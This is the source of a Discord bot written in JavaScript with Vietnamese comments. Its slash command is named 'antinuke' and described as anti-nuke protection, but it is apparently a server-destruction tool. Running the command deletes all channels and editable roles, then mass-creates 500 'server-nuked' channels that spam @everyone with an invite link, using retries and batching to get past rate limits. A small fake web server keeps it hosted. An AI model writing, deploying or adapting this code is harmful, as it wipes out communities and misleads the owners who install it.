import express from "express";
import {
  Client,
  GatewayIntentBits,
  REST,
  Routes,
  SlashCommandBuilder,
  ChannelType
} from "discord.js";
import "dotenv/config";

/* ===== Fake web server ===== */
const app = express();
app.get("/", (req, res) => res.send("Bot online"));
app.listen(process.env.PORT || 3000);
/* =========================== */

const client = new Client({
  intents: [GatewayIntentBits.Guilds]
});

const sleep = ms => new Promise(r => setTimeout(r, ms));

/* ===== CONFIG ===== */
const CHANNEL_NAME = "server-nuked";
const CREATE_TOTAL = 500;
const MSG_PER_CHANNEL = 3;

const DELETE_DELAY = 60;     // delay xoá kênh / role
const MESSAGE_DELAY = 80;   // delay giữa tin nhắn
const CREATE_BATCH = 6;     // số kênh tạo song song mỗi batch
const BATCH_DELAY = 120;    // delay giữa các batch

const RETRY_MAX = 5;
/* ================== */

/* ===== Safe Request Wrapper (Auto retry) ===== */
async function safe(fn, retry = 0) {
  try {
    return await fn();
  } catch (e) {
    const wait = Math.min(3000 + retry * 1000, 8000);
    if (retry >= RETRY_MAX) return null;
    await sleep(wait);
    return safe(fn, retry + 1);
  }
}
/* =========================================== */

/* ===== Slash Command ===== */
const commands = [
  new SlashCommandBuilder()
    .setName("antinuke")
    .setDescription("Anti nuke cực nhanh + ổn định")
].map(cmd => cmd.toJSON());

const rest = new REST({ version: "10" }).setToken(process.env.BOT_TOKEN);

(async () => {
  await rest.put(
    Routes.applicationCommands(process.env.CLIENT_ID),
    { body: commands }
  );
  console.log("✅ Slash command registered");
})();
/* ========================= */

client.once("ready", () => {
  console.log(`🤖 Online: ${client.user.tag}`);
});

client.on("interactionCreate", async interaction => {
  if (!interaction.isChatInputCommand()) return;
  if (interaction.commandName !== "antinuke") return;

  const guild = interaction.guild;

  const control = await safe(() =>
    guild.channels.create({
      name: "antinuke-control",
      type: ChannelType.GuildText
    })
  );

  if (!control) return;

  await control.send("⚠️ Đang xử lý...");

  /* ===== XOÁ CHANNEL ===== */
  for (const ch of guild.channels.cache.values()) {
    if (ch.id === control.id) continue;
    await safe(() => ch.delete());
    await sleep(DELETE_DELAY);
  }

  /* ===== XOÁ ROLE ===== */
  const botPos = guild.members.me.roles.highest.position;
  const roles = guild.roles.cache.filter(r =>
    r.editable && r.name !== "@everyone" && r.position < botPos
  );

  for (const role of roles.values()) {
    await safe(() => role.delete());
    await sleep(DELETE_DELAY);
  }

  await control.send("⚡ Đang tạo kênh...");

  /* ===== TẠO KÊNH + GỬI TIN (BATCH + AUTO RETRY) ===== */
  for (let i = 0; i < CREATE_TOTAL; i += CREATE_BATCH) {
    const batch = [];

    for (let j = 0; j < CREATE_BATCH && i + j < CREATE_TOTAL; j++) {
      batch.push(
        safe(async () => {
          const ch = await guild.channels.create({
            name: CHANNEL_NAME,
            type: ChannelType.GuildText
          });

          for (let k = 0; k < MSG_PER_CHANNEL; k++) {
            await safe(() =>
              ch.send("@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB")
            );
            await sleep(MESSAGE_DELAY);
          }
        })
      );
    }

    await Promise.all(batch);
    await sleep(BATCH_DELAY);
  }

  await control.send("✅ Hoàn tất.");
});

client.login(process.env.BOT_TOKEN);
